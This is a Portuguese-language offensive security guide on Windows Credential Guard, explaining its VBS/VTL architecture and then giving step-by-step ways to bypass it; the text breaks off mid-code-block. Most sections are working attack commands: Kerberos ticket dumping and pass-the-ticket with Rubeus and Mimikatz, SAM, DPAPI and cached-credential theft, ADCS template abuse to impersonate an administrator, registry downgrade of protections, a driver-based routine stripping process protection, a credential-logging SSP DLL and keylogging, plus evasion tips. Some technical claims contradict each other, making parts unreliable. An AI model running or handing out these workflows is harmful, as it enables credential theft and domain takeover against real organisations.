---
layout: cyber
section: evasao-kernel
title: "Credential Guard: Entendendo e Contornando"
---

# Credential Guard: Entendendo e Contornando

# O que é?

Credential Guard é uma feature de segurança baseada em virtualização (VBS — Virtualization-Based Security) introduzida no Windows 10 Enterprise e Windows Server 2016, com ativação por padrão em novos dispositivos Windows 11 21H2 e posteriores que atendem os requisitos de hardware.

O princípio fundamental é o isolamento de segredos de autenticação (hashes NTLM e tickets Kerberos) em um ambiente protegido pelo hypervisor — o VSM (Virtual Secure Mode) — que é completamente inacessível ao sistema operacional convencional, incluindo o próprio kernel do Windows.

Antes do Credential Guard, a arquitetura de autenticação do Windows funcionava assim: o processo `lsass.exe` (Local Security Authority Subsystem Service) executava em Ring 3 (userland) mas com privilégios elevados, e armazenava secrets de autenticação na sua memória de processo. Qualquer processo com `SeDebugPrivilege` e `PROCESS_VM_READ` conseguia fazer `OpenProcess(lsassPID)` + `ReadProcessMemory` e extrair os hashes NTLM e tickets Kerberos diretamente — o que é exatamente o que Mimikatz (`sekurlsa::logonpasswords`) faz.

Com Credential Guard, o processamento e armazenamento de secrets é movido para `lsaiso.exe` (LSA Isolated) — um Trustlet (processo em modo seguro) que executa dentro do VTL 1 (Virtual Trust Level 1), onde o hypervisor garante que nem o kernel do Windows em VTL 0 consegue acessar sua memória.

**HVCI (Hypervisor-Protected Code Integrity)** complementa o Credential Guard protegendo a integridade do próprio kernel: impede que páginas de memória kernel sejam marcadas como executáveis se não forem validadas pelo hypervisor. Isso torna técnicas de kernel patching (como modificar callbacks diretamente via BYOVD) significativamente mais difíceis — modificações em código kernel ativo causam BSOD ou são bloqueadas.

---

# Onde é implementado?

Credential Guard requer uma combinação específica de hardware e configuração de software que define onde ele pode e é deployado:

**Requisitos de hardware mandatórios:**
- CPU 64-bit com suporte a virtualização de hardware: Intel VT-x ou AMD-V
- SLAT (Second Level Address Translation): Intel EPT (Extended Page Tables) ou AMD RVI (Rapid Virtualization Indexing) — necessário para que o hypervisor imponha isolamento de memória física entre VTL 0 e VTL 1
- IOMMU (Input/Output Memory Management Unit): Intel VT-d ou AMD-Vi — protege contra ataques DMA (Direct Memory Access) de dispositivos PCIe que poderiam acessar a memória do VSM
- UEFI Secure Boot — garante que apenas bootloaders assinados são carregados, impedindo que o Hyper-V seja subvertido antes de iniciar
- TPM 2.0 — usado para proteção das chaves de inicialização do VSM e medição do estado de boot

```
  Hardware mínimo para Credential Guard:

  +--------------------------------------------------+
  | CPU com VT-x/AMD-V + EPT/RVI (SLAT)             |
  | Intel Core Haswell (2014+) ou AMD Zen (2017+)    |
  +--------------------------------------------------+
  | IOMMU: Intel VT-d ou AMD-Vi                      |
  | (proteção DMA para o VSM)                        |
  +--------------------------------------------------+
  | UEFI com Secure Boot                             |
  | TPM 2.0                                          |
  +--------------------------------------------------+
  | 4 GB+ RAM (overhead do VSM)                      |
  +--------------------------------------------------+
```

**Onde é ativado por padrão:**

- Windows 11 Enterprise e Education 21H2 e posteriores, com hardware compatível — ativado por padrão sem necessidade de configuração adicional
- Windows 11 Pro 22H2 e posteriores em hardware elegível — ativado automaticamente (mudança de política da Microsoft em 2022)
- Windows Server 2022 em hardware compatível — habilitado por padrão em novas instalações

**Onde é deployado via política em ambientes corporativos:**

- Setor governamental e defesa: mandatório em endpoints federais dos EUA via NIST SP 800-171 e CMMC (Cybersecurity Maturity Model Certification). Todos os endpoints que processam informações sensíveis devem ter Credential Guard ativo.
- Instituições financeiras e bancos: regulações como PCI-DSS e requisitos de proteção de credenciais de acesso a sistemas de pagamento impulsionam o deploy.
- Healthcare e hospitais: HIPAA e proteção de credenciais de acesso a sistemas de prontuário eletrônico (EHR).
- Seguradoras, escritórios de advocacia, empresas com dados sensíveis de clientes: deploy via GPO (Group Policy Object) ou Microsoft Intune/Endpoint Manager.

**Cenário típico de deploy corporativo:**

```
  Active Directory + Microsoft Intune/SCCM:

  Domain Controller (GPO)
        |
        | Computer Configuration → Windows Settings →
        | Security Settings → Device Guard
        |
        +-> "Turn On Virtualization Based Security" = Enabled
        |   Plataform Security Level = Secure Boot AND DMA Protection
        |   Credential Guard = Enabled with UEFI lock
        |
        +-> Aplicado via GPO a OUs:
            Desktops_Criticos/
            Servidores_Tier0/
            PAW (Privileged Access Workstation)/
```

Em ambientes com UEFI lock ativo (`LsaCfgFlags = 2`), a configuração é gravada nas variáveis EFI e não pode ser desabilitada apenas via modificação de registry — requer acesso físico ao firmware da máquina ou boot em modo de recuperação, o que cria um obstáculo adicional significativo para downgrade.

---

# Como funciona de forma adequada?

O Credential Guard usa as camadas de virtualização do Hyper-V para criar um ambiente de execução completamente isolado para secrets de autenticação. Entender essa arquitetura é essencial para compreender tanto o que é protegido quanto o que permanece acessível.

**Camadas VBS — do hardware ao software:**

```
  +----------------------------------------------------------+
  |                    HARDWARE FÍSICO                        |
  |  CPU (VT-x + EPT) + IOMMU (VT-d) + TPM 2.0 + UEFI SB  |
  +-----------------------------+----------------------------+
                                |
  +-----------------------------v----------------------------+
  |           HYPER-V HYPERVISOR (VMX Root / Ring -1)        |
  |                                                           |
  |  Controla acesso à memória física via Extended Page      |
  |  Tables (EPT). Garante que VTL 0 não pode acessar        |
  |  páginas físicas alocadas para VTL 1.                    |
  |                                                           |
  |  IOMMU configurado: dispositivos DMA também não podem    |
  |  acessar memória de VTL 1 diretamente.                   |
  +---------------+---------------------------+--------------+
                  |                           |
  +---------------v---------+   +-------------v-------------+
  |   VTL 0 (Normal World)  |   |  VTL 1 (Secure World)    |
  |                         |   |                           |
  |  Windows Kernel         |   |  Secure Kernel            |
  |  (ntoskrnl.exe)         |   |  (skci.dll, securekernel) |
  |                         |   |                           |
  |  lsass.exe              |   |  lsaiso.exe               |
  |  (LSA normal — sem      |   |  (LSA Isolated Trustlet   |
  |  hashes NTLM reais,     |   |   armazena secrets,       |
  |  sem TGT reais)         |   |   processa autenticação)  |
  |                         |   |                           |
  |  Drivers (Ring 0)       |   |  Trustlets apenas         |
  |  EDR, AV, etc.          |   |  (code integrity          |
  |                         |   |   enforced by hypervisor) |
  |  Aplicações userland    |   |                           |
  |  (Ring 3)               |   |                           |
  +-------------------------+   +---------------------------+

  Fronteira de isolamento:
  VTL 0 (inclusive Ring 0 / kernel / drivers) não pode
  acessar memória de VTL 1 — o hypervisor intercepta e nega.
```

**Como a autenticação NTLM funciona com Credential Guard ativo:**

```
  Sem Credential Guard:                Com Credential Guard:

  Usuário faz login                    Usuário faz login
        |                                    |
  lsass.exe (VTL 0)                   lsass.exe (VTL 0)
  processa credencial                 encaminha para lsaiso.exe
  armazena hash NTLM                        |
  em memória de processo              lsaiso.exe (VTL 1)
        |                             armazena hash NTLM
  Mimikatz:                           em memória VTL 1
  OpenProcess(lsass)                        |
  ReadProcessMemory()     FUNCIONA    Mimikatz:
  → extrai hash NTLM                  OpenProcess(lsass)
                                      ReadProcessMemory()
                                      → memória de lsass em
                                        VTL 0 não contém hash
                                      → acesso a lsaiso em
                                        VTL 1 negado pelo
                                        hypervisor
                                      FALHA — hash não extraível
```

**Como Kerberos opera com Credential Guard — por que tickets ficam em VTL 0:**

```
  Autenticação Kerberos com CG ativo:

  1. lsass.exe (VTL 0) pede TGT ao KDC via lsaiso.exe (VTL 1)
  2. lsaiso.exe gera chave de sessão e interage com KDC
  3. TGT é retornado e armazenado em CACHE no lsass.exe (VTL 0)
     para evitar re-autenticação constante ao KDC
  4. Quando recurso de rede é acessado: lsass usa TGT cacheado
     para pedir TGS (ticket de serviço)

  Implicação CRÍTICA:
  TGTs e TGSs em cache ficam em lsass.exe (VTL 0) —
  acessíveis via API Kerberos legítima (LsaCallAuthenticationPackage).
  Rubeus e Mimikatz (sekurlsa::tickets) conseguem exportar esses
  tickets — mesmo com Credential Guard ativo.
```

**O que a proteção HVCI adiciona ao Credential Guard:**

```
  HVCI (Hypervisor-Protected Code Integrity):

  Sem HVCI:                       Com HVCI:
  VTL 0 kernel pode:              Hypervisor verifica:
  - Alocar RWX memory             - Toda nova página executável
  - Modificar callbacks           - Todo carregamento de driver
    diretamente via BYOVD         - Patches em código kernel
  - Patchear ntoskrnl.exe         
                                  Se código não for assinado
                                  ou for modificado após carga:
                                  → BSOD (proteção de integridade)

  Impacto em BYOVD + CG bypass:
  Com HVCI ativo, zerar callbacks via escrita direta de memória
  pode acionar BSOD. A técnica funciona mas é arriscada —
  requer abordagem diferente (patch de função, não de ponteiro).
```

**Fluxo de inicialização do VBS — como o isolamento é estabelecido:**

```
  Boot sequence com Credential Guard:

  UEFI Firmware (Secure Boot)
        |
        +-> Verifica bootloader (assinado Microsoft)
        v
  Windows Boot Manager (bootmgr.efi)
        |
        +-> Carrega Hyper-V (hvax64.exe / hvloader.efi)
        v
  Hyper-V inicializa em VMX Root (Ring -1)
        |
        +-> Configura EPT para VTL 0 e VTL 1
        +-> Configura IOMMU
        v
  Secure Kernel (VTL 1) inicializa
        |
        +-> Carrega lsaiso.exe como Trustlet
        +-> Estabelece canal RPC protegido com lsass.exe (VTL 0)
        v
  Windows Kernel (VTL 0) inicializa
        |
        +-> lsass.exe inicia
        +-> Conecta ao lsaiso.exe via Virtualization Service Provider (VSP)
        v
  Sistema pronto — secrets em VTL 1, inacessíveis a VTL 0
```

---

## VBS, VTL1 e Por Que LSASS Ficou Fora do Alcance

### Virtualization-Based Security (VBS)

Credential Guard é construído sobre VBS (Virtualization-Based Security), que usa o Hyper-V para criar um ambiente isolado de nível 1 (mais privilegiado que o próprio kernel do Windows):

```
┌─────────────────────────────────────────────────────┐
│                 HARDWARE FÍSICO                      │
└──────────────────┬──────────────────────────────────┘
                   │
┌──────────────────▼──────────────────────────────────┐
│              HYPER-V HYPERVISOR (Ring -1)            │
│  Controla acesso à memória física via SLAT/EPT       │
└───────────────┬───────────────────────┬─────────────┘
                │                       │
┌───────────────▼──────┐   ┌────────────▼─────────────┐
│   VTL 0 (Normal OS)  │   │   VTL 1 (Secure World)   │
│                      │   │                           │
│  Windows Kernel      │   │  Secure Kernel            │
│  lsass.exe           │   │  lsaiso.exe               │
│  EDR Drivers         │   │  Credential Store         │
│  Aplicações          │   │  (hashes NTLM, TGTs)      │
└──────────────────────┘   └───────────────────────────┘
```

**VTL 0 (Virtualization Trust Level 0):** Onde o Windows normal roda — kernel, drivers, aplicações. Mesmo `NT AUTHORITY\SYSTEM` com `SeDebugPrivilege` opera aqui.

**VTL 1 (Virtualization Trust Level 1 — Secure World):** Totalmente isolado. O hypervisor garante que código em VTL 0 não pode acessar memória de VTL 1. `lsaiso.exe` (Isolated LSA) roda aqui.

### O Que lsaiso.exe Protege

`lsaiso.exe` (LSA Isolated) é a versão "segura" do LSA que roda dentro do Secure World. Ele processa e armazena:
- **Hashes NTLM** — armazenados criptografados dentro do enclave VTL 1
- **Kerberos TGTs** — gerenciados pelo `lsaiso.exe`
- **Chaves de criptografia** das credenciais

Quando um processo precisa autenticar, ele faz uma **chamada segura** para `lsaiso.exe` (via canal RPC protegido pelo hypervisor) que realiza a operação criptográfica sem expor o hash/ticket para VTL 0.

### Como Verificar se Credential Guard Está Ativo

```powershell
# Método 1: Get-ComputerInfo
(Get-ComputerInfo).DeviceGuardSecurityServicesRunning
# Output esperado com CG ativo: CredentialGuard, HypervisorEnforcedCodeIntegrity

# Método 2: DeviceGuardSecurityServicesConfigured
(Get-ComputerInfo).DeviceGuardSecurityServicesConfigured

# Método 3: msinfo32 (GUI)
# Início → msinfo32 → "Virtualization-based security Services Running"
# Deve listar "Credential Guard"

# Método 4: via registry
$cgKey = "HKLM:\SYSTEM\CurrentControlSet\Control\LSA"
(Get-ItemProperty $cgKey).LsaCfgFlags
# 1 = Enabled without UEFI lock
# 2 = Enabled with UEFI lock (não pode ser desabilitado via registry sem acesso físico)

# Método 5: verificar se lsaiso.exe está rodando
Get-Process lsaiso -ErrorAction SilentlyContinue
# Se existir = Credential Guard ativo

# Método 6: checar DLL indicators em lsass
# Com CG ativo, lsass.exe carrega MSV1_0.dll diferente
# e tem thread de comunicação com lsaiso.exe
Get-Process lsass | Select-Object -ExpandProperty Modules | 
    Where-Object {$_.ModuleName -like "*msv*"}
```

---

## O Que AINDA É Possível com Credential Guard Ativo

### 1. Kerberos Tickets em LSASS Regular (VTL 0)

Este é o ponto mais importante: **tickets Kerberos de sessões ativas ficam em cache no lsass.exe de VTL 0**, não apenas em lsaiso.exe. Os TGTs e TGSs em memória podem ser extraídos normalmente.

```powershell
# Listar tickets disponíveis com Rubeus
.\Rubeus.exe triage

# Output mostrará tickets por sessão:
# [*] Action: Triage Kerberos Tickets (All Users)
# -----------------------------------------------
# |  LUID   | UserName | Service | EndTime |
# |---------|----------|---------|---------|
# | 0x12345 | alice    | krbtgt  | ...     |
# | 0x12345 | alice    | cifs    | ...     |

# Extrair ticket específico por LUID
.\Rubeus.exe dump /luid:0x12345 /nowrap
# Output: base64 do ticket .kirbi

# Extrair TODOS os tickets
.\Rubeus.exe dump /nowrap

# Extrair e usar imediatamente (Pass-the-Ticket)
.\Rubeus.exe dump /luid:0x12345 /nowrap | Out-File ticket.txt
.\Rubeus.exe ptt /ticket:doQAAAWh...base64...

# Via Mimikatz (ainda funciona para tickets, não para hashes)
privilege::debug
sekurlsa::tickets /export    # Exporta .kirbi files
kerberos::ptt ticket.kirbi   # Injeta ticket
```

**Por que funciona:** O Kerberos Key Distribution Center emite tickets que são armazenados em cache para evitar re-autenticação constante. Esses tickets são armazenados no processo lsass.exe em VTL 0 (não no lsaiso.exe em VTL 1) porque precisam ser acessíveis para autenticação nos recursos da rede.

**O que fazer com os tickets:**
```bash
# Converter kirbi para ccache (para uso no Linux/Kali)
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=/path/to/ticket.ccache

# Usar com psexec
psexec.py -k -no-pass DOMAIN/user@target.domain.com

# Usar com secretsdump
secretsdump.py -k -no-pass DOMAIN/DC@dc.domain.com
```

### 2. SAM Database (Contas Locais)

Credential Guard protege credenciais de domínio, mas **não protege o SAM database** que contém hashes de contas locais.

```powershell
# Método 1: reg save + secretsdump
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY

# Copiar para Kali e extrair
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# Método 2: Volume Shadow Copy
$vss = (Get-WmiObject Win32_ShadowCopy)[0]
$vssPath = $vss.DeviceObject + "\Windows\System32\config\"
Copy-Item "$vssPath\SAM" C:\Windows\Temp\SAM_vss
Copy-Item "$vssPath\SYSTEM" C:\Windows\Temp\SYSTEM_vss

# Método 3: HiveNightmare / SeriousSam (CVE-2021-36934)
# Em versões vulneráveis do Windows 10/11:
icacls C:\Windows\System32\config\sam
# Verificar se Users tem acesso — se sim, vulnerável
copy C:\Windows\System32\config\sam C:\Temp\sam_hn
copy C:\Windows\System32\config\system C:\Temp\system_hn

# Método 4: Mimikatz (requer SeDebugPrivilege, mas não acesso kernel ao VTL1)
privilege::debug
lsadump::sam    # Lê SAM diretamente (ainda funciona com CG)
```

### 3. Cached Domain Credentials (DCC2)

Quando um usuário de domínio faz login, o Windows caches as credenciais localmente para permitir login offline. Esses hashes DCC2 (Domain Cached Credentials v2) são armazenados no registry, não protegidos pelo Credential Guard.

**Formato DCC2 (MS-CACHE v2):** `$DCC2$10240#username#hash`

```powershell
# Via secretsdump
secretsdump.py DOMAIN/admin:password@TARGET_IP
# Seção "Cached domain logon information"

# Via Mimikatz
privilege::debug
lsadump::cache

# Via CrackMapExec
cme smb TARGET_IP -u admin -p password --sam
cme smb TARGET_IP -u admin -p password --lsa  # Inclui cached creds

# Crackear DCC2 com Hashcat:
# hashcat -m 2100 '$DCC2$10240#alice#aabbcc...' rockyou.txt
# Nota: DCC2 é extremamente lento de crackear (design intencional)
# 1000 tentativas/s em GPU potente vs 100M/s para NT hashes
```

### 4. DPAPI (Data Protection API)

DPAPI usa masterkeys armazenadas no perfil do usuário para criptografar segredos. As masterkeys são protegidas pelo hash NTLM do usuário (ou DPAPI domain backup key). Com Credential Guard, o hash NTLM não é diretamente acessível, mas as masterkeys frequentemente ficam descriptografadas em memória no lsass.exe de VTL 0.

```powershell
# Extrair masterkeys via SharpDPAPI
.\SharpDPAPI.exe masterkeys /target:C:\Users\alice\AppData\Roaming\Microsoft\Protect\

# Extrair segredos DPAPI protegidos
.\SharpDPAPI.exe credentials          # Credenciais do Windows Vault
.\SharpDPAPI.exe vaults               # Windows Vault
.\SharpDPAPI.exe certificates         # Certificados com chave privada
.\SharpDPAPI.exe browser              # Senhas do Chrome/Edge/Firefox
.\SharpDPAPI.exe blob /target:arquivo.blob  # Blob específico

# Via Mimikatz (se masterkeys em memória)
privilege::debug
sekurlsa::dpapi  # Extrai masterkeys da memória do lsass (VTL 0)

# Se tiver acesso ao domínio: usar domain backup key
# A DPAPI domain backup key pode descriptografar qualquer masterkey do domínio
lsadump::backupkeys /system:DC.domain.com /export
dpapi::masterkey /in:arquivo.mk /rpc  # Usar backup key via DC

# Impacket:
secretsdump.py -hashes :NTHash DOMAIN/user@TARGET  # Extrai DPAPI masterkeys
dpapi.py masterkeys -file arquivo.mk -sid S-1-5-21-... -key "dpapi_backup_key"
```

**Segredos protegidos por DPAPI em endpoints Windows:**
- Credenciais do Windows Credential Manager
- Senhas salvas em browsers (Chrome, Edge, Firefox)
- Chaves privadas de certificados de usuário
- Tokens OAuth armazenados
- PST files do Outlook
- Wi-Fi PSKs (em alguns casos)

### 5. Certificados via ADCS

Esta é frequentemente a melhor alternativa quando Credential Guard está ativo. Se o ambiente tem ADCS (Active Directory Certificate Services), é possível obter um certificado de usuário/computador que permite autenticar sem precisar do hash NTLM.

```bash
# 1. Listar CAs e templates disponíveis
certipy find -u user@domain.com -p password -dc-ip DC_IP

# 2. Requisitar certificado para um usuário
certipy req -u user@domain.com -p password \
    -ca CA-NAME \
    -template User \
    -dc-ip DC_IP

# Output: user.pfx (certificado + chave privada)

# 3. Usar o certificado para obter TGT
certipy auth -pfx user.pfx -domain domain.com -username user -dc-ip DC_IP
# Output: user.ccache (TGT) + hash NTLM do usuário (hash é gerado via PKINIT)

# 4. Usar TGT
export KRB5CCNAME=user.ccache
klist  # Verificar ticket

# 5. Via Rubeus (Windows)
# Converter PFX para base64
$pfxBytes = [IO.File]::ReadAllBytes("user.pfx")
$pfxB64 = [Convert]::ToBase64String($pfxBytes)

.\Rubeus.exe asktgt /user:alice /certificate:$pfxB64 /password:certpass /domain:domain.com /ptt /nowrap
# Isso resulta em TGT válido injetado na sessão atual

# Para Administrator/DA via template vulnerável (ESC1):
certipy req -u user@domain.com -p password \
    -ca CA-NAME \
    -template VulnerableTemplate \
    -upn administrator@domain.com \  # Impersonar admin
    -dc-ip DC_IP

certipy auth -pfx administrator.pfx -domain domain.com -username administrator -dc-ip DC_IP
# Obtém hash NTLM do Administrator mesmo com Credential Guard!
```

---

## Técnicas de Bypass Direto

### Bypass 1: Downgrade via Registry (Sem UEFI Lock)

Se Credential Guard foi habilitado via GPO mas **não está locked no firmware UEFI**, pode ser desabilitado via registry. Requer acesso de SYSTEM e reboot.

```powershell
# Verificar se está locked (LsaCfgFlags = 1 = sem lock, = 2 = com lock UEFI)
(Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\LSA").LsaCfgFlags

# Se valor for 1 (sem UEFI lock): pode desabilitar
reg add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v LsaCfgFlags /t REG_DWORD /d 0 /f

# Desabilitar VBS
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f

# Desabilitar requerimento de HyperV
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v RequirePlatformSecurityFeatures /t REG_DWORD /d 0 /f

# Remover chave de configuração
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /f

# Reboot necessário para efeito
Restart-Computer -Force
# Após reboot: Mimikatz sekurlsa::logonpasswords funcionará
```

**Limitação crítica:** Requer reboot (alertará SOC se monitorado) e não funciona se UEFI lock estiver ativo (LsaCfgFlags = 2).

**Como verificar se UEFI lock está ativo:**
```powershell
# LsaCfgFlags = 2 significa UEFI lock
$lsaFlags = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\LSA").LsaCfgFlags
if ($lsaFlags -eq 2) {
    Write-Host "UEFI Lock ativo - bypass via registry não funcionará"
} elseif ($lsaFlags -eq 1) {
    Write-Host "Sem UEFI lock - downgrade possível via registry + reboot"
}
```

### Bypass 2: BYOVD para Desativar PPL de lsaiso.exe

`lsaiso.exe` roda como processo PPL (Protected Process Light) com nível de proteção `WinTcb-Light`. Usando BYOVD (driver vulnerável com kernel R/W), é possível patchear a proteção PPL na estrutura `EPROCESS` do `lsaiso.exe`.

```c
// Estrutura simplificada de EPROCESS relevante para PPL:
typedef struct _PS_PROTECTION {
    union {
        UCHAR Level;
        struct {
            UCHAR Type   : 3;  // PS_PROTECTED_TYPE
            UCHAR Audit  : 1;
            UCHAR Signer : 4;  // PS_PROTECTED_SIGNER
        };
    };
} PS_PROTECTION;

// A proteção PPL fica no offset EPROCESS.Protection
// Offset varia por versão do Windows

// Para desativar: zerar o byte de proteção do lsaiso.exe via driver BYOVD
DWORD64 lsaisoEprocess = GetEprocessByPID(hDriver, lsaisoPID);
DWORD64 protectionAddr = lsaisoEprocess + EPROCESS_PROTECTION_OFFSET;

// Ler proteção atual
BYTE currentProt = ReadMemoryByte(hDriver, protectionAddr);
printf("[*] lsaiso.exe Protection: 0x%02X\n", currentProt);

// Zerar proteção PPL
WriteMemoryByte(hDriver, protectionAddr, 0x00);
printf("[+] PPL de lsaiso.exe removido\n");
```

Após remover PPL do lsaiso.exe, ferramentas de dumping como Mimikatz conseguem acessar o processo e extrair credenciais. **Esta é uma técnica altamente destrutiva e barulhenta — BSOD ou crash do lsaiso são possíveis.**

### Bypass 3: Captura em Trânsito (SSP/AP Injection)

Ao invés de tentar ler credenciais armazenadas, instalar um Security Support Provider (SSP) customizado que captura credenciais **durante a autenticação** — antes de chegarem ao lsaiso.exe.

```c
// SSP .DLL customizado que loga credenciais:
BOOL WINAPI SpAcceptCredentials(
    SECURITY_LOGON_TYPE LogonType,
    PUNICODE_STRING AccountName,
    PSECPKG_PRIMARY_CRED PrimaryCredentials,
    PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials
) {
    // Captura cleartext antes do Credential Guard processar
    LogCredential(AccountName, PrimaryCredentials->Password);
    return TRUE;
}
```

```powershell
# Instalar SSP via Mimikatz (requer admin)
# Carrega DLL maliciosa como SSP — captura cleartext no próximo logon
misc::memssp    # Carrega em memória (não persiste após reboot)

# Ou via registry (persiste):
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0myssap"
# Requer colocar myssap.dll em C:\Windows\System32\

# Observar capturas em: C:\Windows\System32\mimilsa.log
```

### Bypass 4: Keylogger / API Hooking

Capturar credenciais na camada de aplicação — independente de Credential Guard:

```powershell
# Via Cobalt Strike (keylogger no processo alvo)
keylogger  # No beacon

# Via Mimikatz (loga credenciais de logon interativo)
privilege::debug
misc::memssp

# Via processo fake de autenticação (credential prompt spoofing)
# Apresentar dialog falso de autenticação ao usuário
```

---

## Exemplos de Código / Comandos

### Workflow Completo: Ambiente com Credential Guard Ativo

```bash
# PASSO 1: Confirmar Credential Guard está ativo
# (no sistema comprometido, PowerShell)
(Get-ComputerInfo).DeviceGuardSecurityServicesRunning
Get-Process lsaiso

# PASSO 2: Tentar Rubeus para Kerberos tickets (geralmente funciona)
.\Rubeus.exe triage
.\Rubeus.exe dump /nowrap

# PASSO 3: Enumerar templates ADCS disponíveis
.\Certify.exe find /vulnerable
# ou no Kali:
certipy find -u user@domain.com -p password -dc-ip DC_IP -stdout

# PASSO 4: Se template vulnerável disponível (ESC1/ESC4/etc)
certipy req -u user@domain.com -p password -ca CORP-CA -template VulnTemplate -upn administrator@domain.com -dc-ip DC_IP
certipy auth -pfx administrator.pfx -domain domain.com -username administrator -dc-ip DC_IP

# PASSO 5: Usar hash NTLM obtido via PKINIT (mesmo com CG ativo!)
# certipy auth retorna o hash NT do usuário alvo
secretsdump.py -hashes :HASH_NT_OBTIDO DOMAIN/administrator@DC_IP

# PASSO 6: SAM database (sempre disponível)
reg save HKLM\SAM C:\Windows\Temp\s && reg save HKLM\SYSTEM C:\Windows\Temp\sy && reg save HKLM\SECURITY C:\Windows\Temp\se
# Download e:
secretsdump.py -sam s -system sy -security se LOCAL

# PASSO 7: DPAPI secrets (independente de CG)
.\SharpDPAPI.exe triage
.\SharpDPAPI.exe credentials
.\SharpDPAPI.exe browser /target:chrome
```

### Verificação de Status Completa do VBS/CG

```powershell
# Script completo de diagnóstico VBS/Credential Guard
$ci = Get-ComputerInfo
$report = @{
    "VBS Status"                = $ci.DeviceGuardVirtualizationBasedSecurityStatus
    "VBS Configured"            = $ci.DeviceGuardVirtualizationBasedSecurityConfigured
    "Services Running"          = $ci.DeviceGuardSecurityServicesRunning
    "Services Configured"       = $ci.DeviceGuardSecurityServicesConfigured
    "Required Features"         = $ci.DeviceGuardRequiredSecurityProperties
    "Available Features"        = $ci.DeviceGuardAvailableSecurityProperties
    "HVCI Status"               = $ci.DeviceGuardCodeIntegrityPolicyEnforcementStatus
}

$report.GetEnumerator() | Sort-Object Name | ForEach-Object {
    Write-Host "$($_.Key): $($_.Value)"
}

# Verificar LsaCfgFlags para saber se UEFI lock
$lsaFlags = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -ErrorAction SilentlyContinue).LsaCfgFlags
switch ($lsaFlags) {
    0 { Write-Host "CG: Disabled" }
    1 { Write-Host "CG: Enabled WITHOUT UEFI lock (registry downgrade possível)" }
    2 { Write-Host "CG: Enabled WITH UEFI lock (não pode desabilitar sem acesso físico)" }
    default { Write-Host "CG: Not configured" }
}
```

### Tabela: O Que CG Protege e O Que Não Protege

| Alvo | Com Credential Guard | Método Alternativo |
|------|---------------------|-------------------|
| Hash NTLM de usuário de domínio | BLOQUEADO | ADCS → PKINIT → hash |
| TGT Kerberos | BLOQUEADO (lsaiso) | Rubeus dump (cache VTL0) |
| TGS Kerberos (tickets de serviço) | BLOQUEADO (lsaiso) | Rubeus dump (cache VTL0) |
| Hash NT de conta local | DISPONIVEL | reg save SAM + secretsdump |
| Cached Domain Credentials (DCC2) | DISPONIVEL | secretsdump -lsa |
| Masterkeys DPAPI | DISPONIVEL (em memória lsass VTL0) | SharpDPAPI, Mimikatz sekurlsa::dpapi |
| Senhas de navegadores | DISPONIVEL | SharpDPAPI browser |
| Kerberos tickets em cache | DISPONIVEL | Rubeus triage/dump |
| Cleartext em WDigest | DEPENDE (WDigest deve estar off) | Se WDigest=1: Mimikatz logonpasswords |
| Certificados com chave privada | DISPONIVEL | SharpDPAPI certificates, certipy |
| LSA Secrets | DISPONIVEL | secretsdump -lsa |

---

## Detecção e OPSEC

### Como a Defesa Detecta Tentativas de Bypass

**Tentativa de downgrade via registry:**
- Event ID 4657: "A registry value was modified" — chave `HKLM\SYSTEM\...\Lsa\LsaCfgFlags`
- Mudança em `EnableVirtualizationBasedSecurity`
- Reboot inesperado subsequente

**Rubeus dump de tickets:**
- Acesso ao processo lsass.exe (Event ID 4656 — handle ao objeto)
- Mas Rubeus usa APIs Kerberos do Windows (não OpenProcess/ReadProcessMemory) para tickets — menos detectável
- Ainda assim gera eventos de acesso privilegiado

**BYOVD para remover PPL lsaiso:**
- Sysmon Event 6: driver não-padrão carregado
- Event 7045: novo serviço de kernel instalado
- Crash do lsaiso.exe / BSOD gera análise forense

**ADCS exploitation:**
- Evento de requisição de certificado no CA (Event ID 4886 no Certificate Services)
- Certificado com UPN diferente do requirente (red flag para ESC1)
- Certipy e Certify geram queries LDAP detectáveis

### OPSEC para Extração de Tickets Kerberos

Rubeus dump é menos invasivo que Mimikatz porque usa APIs Kerberos legítimas:
```powershell
# Menos detectável: usar LsaCallAuthenticationPackage via Rubeus
# ao invés de OpenProcess + ReadProcessMemory no lsass

# Ainda mais discreto: extrair ticket da sessão atual apenas
.\Rubeus.exe triage          # Apenas listagem, sem acesso ao processo
.\Rubeus.exe dump /nowrap    # Extrai via API Kerberos

# Verificar proteção do processo lsass antes de tentar acesso direto
Get-Process lsass | Select-Object -Property ProtectedMemory
```

---

## Arquitetura VTL — VBS/Secure World Internals

### VTL (Virtual Trust Levels) — Como o Isolamento Funciona

```
VTL 0 — Normal World               VTL 1 — Secure World
─────────────────────              ──────────────────────
Ring 3: processos user-mode        Ring 3: Trustlets (IUM — Isolated User Mode)
Ring 0: NT Kernel + Executive      Ring 0: Secure Kernel (securekernel.exe)

Hypervisor controla transições entre VTLs via VMFUNC / VMCALL
SLAT (EPT/NPT) enforça W^X e isolamento de memória entre VTLs
```

Transição entre VTLs:
- VTL 0 não pode fazer VMCALL para VTL 1 arbitrariamente
- Secure Kernel expõe uma superfície de chamada controlada (`VslpEnterIumSecureMode`)
- Toda comunicação de Lsass.exe → Lsaiso.exe passa por **ALPC** (Local Procedure Call assíncrono)

### lsaiso.exe — LSA Isolated (Trustlet)

`lsaiso.exe` é um **Trustlet** (processo IUM — Isolated User Mode) rodando em VTL 1:

```
C:\Windows\System32\lsaiso.exe
  Assinado com certificado IUM especial (não WHQL/normal)
  Usa Iumdll.dll em vez de Ntdll.dll como base
  PPL WinSystem(7) — máxima proteção de processo em VTL 0 também
  Recebe hashes e chaves via ALPC de Lsass.exe
  Cifra-os sob chave derivada do TPM/Secure Boot
```

Verificar presença:
```powershell
